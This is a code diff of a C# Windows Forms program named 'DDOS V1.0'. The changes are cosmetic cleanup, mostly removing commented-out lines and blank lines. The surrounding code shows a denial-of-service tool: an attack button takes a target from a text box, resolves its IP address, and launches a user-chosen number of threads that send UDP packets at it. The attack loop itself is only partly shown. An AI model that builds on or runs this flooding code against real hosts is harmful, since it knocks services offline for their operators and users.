@@ -21,9 +21,6 @@ namespace DDOS_V1._0
             InitializeComponent();
         }
 
-
-
-
         private void X_Click(object sender, EventArgs e)
         {
             Application.Exit();
@@ -32,15 +29,12 @@ namespace DDOS_V1._0
         private async void attackButton_Click(object sender, EventArgs e)
         {
 
-            Program.trgt = targetBox.Text;
-
             var result = await CallAttack();
             
         }
 
         public Task<string> CallAttack()
         {
-            string status = "";
             try
             {
                 var threadCount = Convert.ToInt32(limitBox.Text);
@@ -57,15 +51,12 @@ namespace DDOS_V1._0
                 foreach (var thread in taskArray) //
                 {
                     count++;
-                    //thread.IsBackground = true;
-                    //thread.Start();
                     Thread.Sleep(3);
                     infoBox.AppendText($"thread{count} Started Working..");
                     infoBox.AppendText(Environment.NewLine);
                 }
 
                 Task.WaitAll(taskArray);
-                status = "success";
                 return Task.Run(() => string.Empty);
             }
             catch (Exception ex)
@@ -80,7 +71,6 @@ namespace DDOS_V1._0
         public async Task Attack()
         {
             ///Thread and things for DDOS v1.0
-            //var trgt = target;
 
             var trgt = targetBox.Text;
 
@@ -89,7 +79,6 @@ namespace DDOS_V1._0
             try
             {
                 var ip = await GetIPAddress($"{trgt}");
-                //infoBox.Text = $"Target Ip Address {ip}";
 
                 UdpClient client = new UdpClient();
                 var sendBytes = GetBytesFromString();
@@ -109,9 +98,6 @@ namespace DDOS_V1._0
 
                 MessageBox.Show(ex.Message);
             }
-
-            //infoBox.Text = $"Target = {target}, target Ip = {ip}, requests = {limit}, limit = {limit}";
-            //infoBox.Text = $"Target = {target}, target Ip = {ip}";
 
         }
 
@@ -138,9 +124,6 @@ namespace DDOS_V1._0
             return sendBytes;
         }
 
-
-
-
         private void stopButton_Click(object sender, EventArgs e)
         {
             try
@@ -156,7 +139,6 @@ namespace DDOS_V1._0
 
         private void Stop()
         {
-            /// stop attack
             Application.Exit();
         }
 
